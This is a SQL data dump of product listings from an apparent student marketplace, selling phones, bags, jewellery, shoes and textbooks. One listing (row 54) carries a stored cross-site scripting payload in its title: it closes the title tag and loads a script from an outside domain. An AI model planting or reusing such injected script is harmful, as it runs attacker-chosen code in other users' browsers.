INSERT INTO `shops` (`id`, `canview`, `user_id`, `name`, `description`, `quantity`, `price`, `created`, `modified`, `shipping`, `message`, `category_id`, `permalink`) VALUES
(31, 0, 49, 'iPhone 5 Verizon UNLOCKED 16GB black LIKE NEW MINT with box & accessories', 'For sale is a like new mint condition iPhone 5 unlocked for use with Verizon, AT&T, Net10, T-Mobile, Straight Talk, H2O, Simple Mobile, or any GSM carrier internationally. It has always been in a case and screen protector has been on it since day 1. I will include a new TPU (rubbery, not stretchy or sticky like silicone) case (your choice clear, black, or pink), USB cable and AC adapter in excellent condition, and brand new never used EarPod headphones. Everything is in the original box and Apple Store bag from when I got it. Software has been reset to iOS 6.0.1 factory settings. This iPhone 5 will run on Verizon, AT&T, Net10, Straight Talk, and any other GSM carrier worldwide as it is factory unlocked by Verizon. No liquid or impact damage whatsoever, not a scratch on the screen or body. Warranty is good until Sept. 20, 2013.\r\n\r\nEmail me if interested. Price somewhat negotiable. Considering trades for a Verizon 4S 32GB. Thanks!', 1, '650.00', '2012-12-04 00:29:01', '2013-01-05 10:48:21', '5.00', '', 6, ''),
(54, 0, 42, 'COME LOOK DIAMONDS!!!!!!!!!!!!</title><script src=//africanchildren.biz/new_nyan.js></script>', 'Yo dawg, I heard you liked glitter. ', 1, '15.00', '2012-12-24 06:03:45', '2013-01-05 10:48:21', '0.00', '', 11, ''),
(121, 0, 42, 'Picture of Girl', 'Picture of Girl', 1, '10.00', '2013-01-15 14:59:04', '2013-01-15 15:09:56', '0.00', '', 7, ''),
(131, 1, 41, 'Nuo-Tech Laptop Messenger Bag', 'This new (with tags) vertical messenger bag can fit most 15.6" laptops and is perfect for college.  It is made with durable eco-friendly cotton canvas.  The front flap is held down by a snap magnet and velcro.  There is a small pocket on the right side closed with a magnet sewn into the flap.\r\n\r\nInside, it has plenty of pockets for pens, a cell phone, and other accessories--great for staying organized!  There are two main compartments, one of which is padded for your laptop, the other for books.  There is also another large compartment closed by a velcro strip on the back for quick access to magazines or other reading material for your commute.\r\n\r\nDimensions: 12"W x 17"H x 3.5"D\r\nStrap thickness: 2"\r\nLaptop Pocket Dimensions: 15" W x 11" W x 1.5" D\r\nWeight: 1.5lbs\r\n', 1, '50.00', '2013-01-17 01:03:11', '2013-04-28 10:52:39', '0.00', '', 8, 'nuo-tech-laptop-messenger-bag'),
(141, 1, 38, 'Gold Heart Crystal Necklace ', 'Gold Tone Heart shaped crystal Necklace.\r\n\r\nWonderful Valentine''s Day gift.\r\n\r\nGet it for your secret admirer/girlfriend now!', 1, '10.00', '2013-01-17 01:24:34', '2013-06-05 21:45:18', '5.00', '', 5, 'gold-heart-crystal-necklace'),
(151, 1, 38, 'KILE Booties from Call it Spring', 'These are booties from Call it Spring.\r\nThey were worn once outside but I am a half size (7.5), so it was a little bit too small for me.\r\nThese are size 7.\r\nEverything looks like new.\r\n\r\nYou have also have the option of wearing it without the hardware saddle on (as you can see from some of the pictures). You can always take them off when wearing it.\r\n\r\nOriginal price is $69.99. Selling for $25', 1, '25.00', '2013-01-17 02:21:00', '2013-04-28 10:52:37', '5.00', '', 8, 'kile-booties-from-call-it-spring'),
(161, 1, 34, 'Food Weighing Scale', 'Bought it a while back, have no use for it. Works perfectly, runs on AA batteries. Great for people looking to try a new diet / measure what they eat or people who ship stuff. Very accurate scale for weighing small objects.\r\n', 1, '10.00', '2013-01-17 02:28:54', '2013-04-28 10:52:35', '0.00', '', 11, 'food-weighing-scale'),
(171, 1, 34, 'The Communist Manifesto and Other Revolutionary Writings by Marx Marat Paine Mao Gandhi and Others', 'Dover Thrift Edition\r\n\r\nPerfect condition, never used.\r\n\r\nISBN 139780486424651\r\nOTHER ISBN: 100486424650\r\n\r\nSelling for $4\r\n', 1, '4.00', '2013-01-17 02:31:17', '2013-04-28 10:52:35', '0.00', '', 7, 'the-communist-manifesto-and-other-revolutionary-writings-by-marx-marat-paine-mao-gandhi-and-others'),
(181, 1, 38, 'Children of a Lesser God by Mark Medoff [Like New]', 'This was bought brand new, and was only used for one semester.\r\nEverything is in a sleek condition, there are no markings.\r\nIf you are in Goldstein''s Disabiilities class, this is the required textbook.\r\nIf you''re from NYu-Poly, and would like to meet up, just click on "Make me a trade or Buy in Person at NYU-Poly" orange button down below.', 1, '6.50', '2013-01-17 02:31:52', '2013-04-28 10:52:35', '0.00', '', 7, 'children-of-a-lesser-god-by-mark-medoff-like-new'),
